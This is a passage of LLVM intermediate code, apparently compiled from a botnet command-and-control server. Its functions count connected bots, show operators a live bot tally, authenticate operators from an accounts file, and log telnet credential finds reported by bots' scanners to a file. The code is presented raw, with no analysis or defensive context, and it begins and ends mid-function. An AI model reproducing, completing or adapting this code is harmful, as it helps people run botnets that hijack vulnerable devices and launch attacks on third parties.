  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %183

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %183

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  br label %88

183:                                              ; preds = %175, %162, %102, %101
  br label %292

184:                                              ; preds = %77
  %185 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %186 = load i32, i32* %7, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %185, i64 %187
  %189 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %188, i32 0, i32 1
  %190 = bitcast %union.epoll_data* %189 to i32*
  %191 = load i32, i32* %190, align 1
  store i32 %191, i32* %13, align 4
  %192 = load i32, i32* %13, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %193
  store %struct.clientdata_t* %194, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %195 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %196 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %195, i32 0, i32 1
  store i8 1, i8* %196, align 4
  br label %197

197:                                              ; preds = %184, %288
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %198, i8 0, i64 2048, i1 false)
  br label %199

199:                                              ; preds = %263, %262, %255, %247, %231, %225, %197
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  %201 = icmp ne i8* %200, null
  br i1 %201, label %202, label %208

202:                                              ; preds = %199
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = load i32, i32* %13, align 4
  %205 = call i32 @fdgets(i8* %203, i32 2048, i32 %204)
  %206 = sext i32 %205 to i64
  store i64 %206, i64* %16, align 8
  %207 = icmp sgt i64 %206, 0
  br label %208

208:                                              ; preds = %202, %199
  %209 = phi i1 [ false, %199 ], [ %207, %202 ]
  br i1 %209, label %210, label %266

210:                                              ; preds = %208
  %211 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %213 = icmp eq i8* %212, null
  br i1 %213, label %214, label %215

214:                                              ; preds = %210
  store i32 1, i32* %15, align 4
  br label %266

215:                                              ; preds = %210
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %216)
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %219 = icmp eq i32 %218, 0
  br i1 %219, label %220, label %226

220:                                              ; preds = %215
  %221 = load i32, i32* %13, align 4
  %222 = call i64 @send(i32 %221, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i64 5, i32 16384)
  %223 = icmp eq i64 %222, -1
  br i1 %223, label %224, label %225

224:                                              ; preds = %220
  store i32 1, i32* %15, align 4
  br label %266

225:                                              ; preds = %220
  br label %199, !llvm.loop !13

226:                                              ; preds = %215
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %228 = call i8* @strstr(i8* %227, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = icmp eq i8* %228, %229
  br i1 %230, label %231, label %242

231:                                              ; preds = %226
  %232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %233 = call i8* @strstr(i8* %232, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %234 = getelementptr inbounds i8, i8* %233, i64 7
  store i8* %234, i8** %18, align 8
  %235 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %236 = load i8*, i8** %18, align 8
  %237 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %235, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* %236)
  %238 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %239 = call i32 @fflush(%struct._IO_FILE* %238)
  %240 = load volatile i32, i32* @TELFound, align 4
  %241 = add nsw i32 %240, 1
  store volatile i32 %241, i32* @TELFound, align 4
  br label %199, !llvm.loop !13

242:                                              ; preds = %226
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = call i8* @strstr(i8* %243, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = icmp eq i8* %244, %245
  br i1 %246, label %247, label %250

247:                                              ; preds = %242
  %248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %249 = call i8* @strstr(i8* %248, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  store i8* %249, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

250:                                              ; preds = %242
  %251 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %252 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = icmp eq i8* %252, %253
  br i1 %254, label %255, label %258

255:                                              ; preds = %250
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %257 = call i8* @strstr(i8* %256, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  store i8* %257, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

258:                                              ; preds = %250
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %260 = call i32 @strcmp(i8* %259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #8
  %261 = icmp eq i32 %260, 0
  br i1 %261, label %262, label %263

262:                                              ; preds = %258
  br label %199, !llvm.loop !13

263:                                              ; preds = %258
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %265 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i64 0, i64 0), i8* %264)
  br label %199, !llvm.loop !13

266:                                              ; preds = %224, %214, %208
  %267 = load i64, i64* %16, align 8
  %268 = icmp eq i64 %267, -1
  br i1 %268, label %269, label %275

269:                                              ; preds = %266
  %270 = call i32* @__errno_location() #10
  %271 = load i32, i32* %270, align 4
  %272 = icmp ne i32 %271, 11
  br i1 %272, label %273, label %274

273:                                              ; preds = %269
  store i32 1, i32* %15, align 4
  br label %274

274:                                              ; preds = %273, %269
  br label %289

275:                                              ; preds = %266
  %276 = load i64, i64* %16, align 8
  %277 = icmp eq i64 %276, 0
  br i1 %277, label %278, label %279

278:                                              ; preds = %275
  store i32 1, i32* %15, align 4
  br label %289

279:                                              ; preds = %275
  br label %280

280:                                              ; preds = %279
  %281 = load i32, i32* %15, align 4
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %288

283:                                              ; preds = %280
  %284 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %285 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %284, i32 0, i32 1
  store i8 0, i8* %285, align 4
  %286 = load i32, i32* %13, align 4
  %287 = call i32 @close(i32 %286)
  br label %288

288:                                              ; preds = %283, %280
  br label %197

289:                                              ; preds = %278, %274
  br label %290

290:                                              ; preds = %289
  br label %291

291:                                              ; preds = %290
  br label %292

292:                                              ; preds = %291, %183, %58
  %293 = load i32, i32* %7, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %7, align 4
  br label %27, !llvm.loop !14

295:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %6 = load i8*, i8** %2, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %1, %25
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 2048, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %11 = call i32 @BotsConnected()
  %12 = load i32, i32* %3, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %13
  %15 = getelementptr inbounds %struct.login_info, %struct.login_info* %14, i32 0, i32 0
  %16 = getelementptr inbounds [100 x i8], [100 x i8]* %15, i64 0, i64 0
  %17 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.16, i64 0, i64 0), i32 27, i32 %11, i8* %16, i32 7) #9
  %18 = load i32, i32* %4, align 4
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %21 = call i64 @strlen(i8* %20) #8
  %22 = call i64 @send(i32 %18, i8* %19, i64 %21, i32 16384)
  %23 = icmp eq i64 %22, -1
  br i1 %23, label %24, label %25

24:                                               ; preds = %8
  ret i8* null

25:                                               ; preds = %8
  %26 = call i32 @sleep(i32 2)
  br label %8
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [500 x i8], align 16
  %22 = alloca [500 x i8], align 16
  %23 = alloca [500 x i8], align 16
  %24 = alloca [500 x i8], align 16
  %25 = alloca [500 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [2048 x i8], align 16
  %41 = alloca [2048 x i8], align 16
  %42 = alloca [2048 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [800 x i8], align 16
  %45 = alloca [800 x i8], align 16
  %46 = alloca [800 x i8], align 16
  %47 = alloca [800 x i8], align 16
  %48 = alloca [800 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [800 x i8], align 16
  %51 = alloca [800 x i8], align 16
  %52 = alloca [800 x i8], align 16
  %53 = alloca [800 x i8], align 16
  %54 = alloca [800 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca [2048 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [2048 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [2048 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca %struct._IO_FILE*, align 8
  %64 = alloca i64, align 8
  %65 = alloca %struct.tm*, align 8
  %66 = alloca [50 x i8], align 16
  %67 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %68 = load i8*, i8** %3, align 8
  %69 = ptrtoint i8* %68 to i32
  store i32 %69, i32* %4, align 4
  %70 = load volatile i32, i32* @OperatorsConnected, align 4
  %71 = add nsw i32 %70, 1
  store volatile i32 %71, i32* @OperatorsConnected, align 4
  %72 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %72, i8 0, i64 2048, i1 false)
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %73, i8 0, i64 2048, i1 false)
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %74, i8 0, i64 2048, i1 false)
  %75 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %75, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %76 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %76, %struct._IO_FILE** %13, align 8
  br label %77

77:                                               ; preds = %82, %1
  %78 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %79 = call i32 @feof(%struct._IO_FILE* %78) #9
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br i1 %81, label %82, label %87

82:                                               ; preds = %77
  %83 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %84 = call i32 @fgetc(%struct._IO_FILE* %83)
  store i32 %84, i32* %15, align 4
  %85 = load i32, i32* %14, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %14, align 4
  br label %77, !llvm.loop !17

87:                                               ; preds = %77
  store i32 0, i32* %16, align 4
  %88 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %88)
  br label %89

89:                                               ; preds = %94, %87
  %90 = load i32, i32* %16, align 4
  %91 = load i32, i32* %14, align 4
  %92 = sub nsw i32 %91, 1
  %93 = icmp ne i32 %90, %92
  br i1 %93, label %94, label %109

94:                                               ; preds = %89
  %95 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %96 = load i32, i32* %16, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %97
  %99 = getelementptr inbounds %struct.login_info, %struct.login_info* %98, i32 0, i32 0
  %100 = getelementptr inbounds [100 x i8], [100 x i8]* %99, i64 0, i64 0
  %101 = load i32, i32* %16, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %102
  %104 = getelementptr inbounds %struct.login_info, %struct.login_info* %103, i32 0, i32 1
  %105 = getelementptr inbounds [100 x i8], [100 x i8]* %104, i64 0, i64 0
  %106 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %95, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.17, i64 0, i64 0), i8* %100, i8* %105)
  %107 = load i32, i32* %16, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %16, align 4
  br label %89, !llvm.loop !18

109:                                              ; preds = %89
  %110 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %110, i8 0, i64 2048, i1 false)
  %111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %112 = call i32 (i8*, i8*, ...) @sprintf(i8* %111, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0)) #9
  %113 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %114 = call i32 (i8*, i8*, ...) @sprintf(i8* %113, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.19, i64 0, i64 0)) #9
  %115 = load i32, i32* %4, align 4
  %116 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %117 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %118 = call i64 @strlen(i8* %117) #8
  %119 = call i64 @send(i32 %115, i8* %116, i64 %118, i32 16384)
  %120 = icmp eq i64 %119, -1
  br i1 %120, label %121, label %122

121:                                              ; preds = %109
  br label %913

122:                                              ; preds = %109
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %124 = load i32, i32* %4, align 4
  %125 = call i32 @fdgets(i8* %123, i32 2048, i32 %124)
  %126 = icmp slt i32 %125, 1
  br i1 %126, label %127, label %128

127:                                              ; preds = %122
  br label %913

128:                                              ; preds = %122
  %129 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %129)
  %130 = load i32, i32* %5, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %131
  %133 = getelementptr inbounds %struct.login_info, %struct.login_info* %132, i32 0, i32 0
  %134 = getelementptr inbounds [100 x i8], [100 x i8]* %133, i64 0, i64 0
  %135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %136 = call i32 (i8*, i8*, ...) @sprintf(i8* %134, i8* %135) #9
  %137 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %137, i8** %19, align 8
  %138 = load i8*, i8** %19, align 8
  %139 = call i32 @Find_Login(i8* %138)
  store i32 %139, i32* %5, align 4
  %140 = load i8*, i8** %19, align 8
  %141 = load i32, i32* %5, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %142
  %144 = getelementptr inbounds %struct.login_info, %struct.login_info* %143, i32 0, i32 0
  %145 = getelementptr inbounds [100 x i8], [100 x i8]* %144, i64 0, i64 0
  %146 = call i32 @strcmp(i8* %140, i8* %145) #8
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %148, label %318

148:                                              ; preds = %128
  %149 = load i32, i32* %4, align 4
  %150 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %151 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %152 = call i64 @strlen(i8* %151) #8
  %153 = call i64 @send(i32 %149, i8* %150, i64 %152, i32 16384)
  %154 = icmp eq i64 %153, -1
  br i1 %154, label %155, label %156

155:                                              ; preds = %148
  br label %913

156:                                              ; preds = %148
  %157 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %158 = load i32, i32* %5, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %159
  %161 = getelementptr inbounds %struct.login_info, %struct.login_info* %160, i32 0, i32 0
  %162 = getelementptr inbounds [100 x i8], [100 x i8]* %161, i64 0, i64 0
  %163 = call i32 (i8*, i8*, ...) @sprintf(i8* %157, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i64 0, i64 0), i8* %162) #9
  %164 = load i32, i32* %4, align 4
  %165 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %166 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %167 = call i64 @strlen(i8* %166) #8
  %168 = call i64 @send(i32 %164, i8* %165, i64 %167, i32 16384)
  %169 = icmp eq i64 %168, -1
  br i1 %169, label %170, label %171

170:                                              ; preds = %156
  br label %913

171:                                              ; preds = %156
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %173 = load i32, i32* %4, align 4
  %174 = call i32 @fdgets(i8* %172, i32 2048, i32 %173)
  %175 = icmp slt i32 %174, 1
  br i1 %175, label %176, label %177

176:                                              ; preds = %171
  br label %913

177:                                              ; preds = %171
  %178 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %178)
